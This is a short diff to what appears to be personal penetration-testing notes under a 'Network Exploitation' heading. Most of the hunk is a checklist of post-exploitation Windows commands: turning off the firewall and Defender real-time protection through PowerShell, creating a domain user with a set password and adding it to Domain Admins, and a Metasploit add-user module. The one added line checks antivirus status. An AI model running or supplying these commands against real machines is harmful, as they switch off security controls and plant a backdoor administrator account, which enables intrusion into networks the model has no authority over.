@@ -253,6 +253,7 @@ a. Network Exploitation
 		run commands to do the following:
 		1. disable firewall: set command 'powershell set-netfirewallprofile -name public -enabled false'
 		2. disable antivirus: set command 'powershell set-MPPreference -DisableRealtimeMonitoring $true'
+		   check antivirus: Get-MpComputerStatus
 		3a. create user: set command 'net user david2 1234567aA /add /domain'
 			add user to domain: set command 'net group "Domain Admins" david2 /add /domain
 		3b. create user using: msf post(windows/manage/add_user)
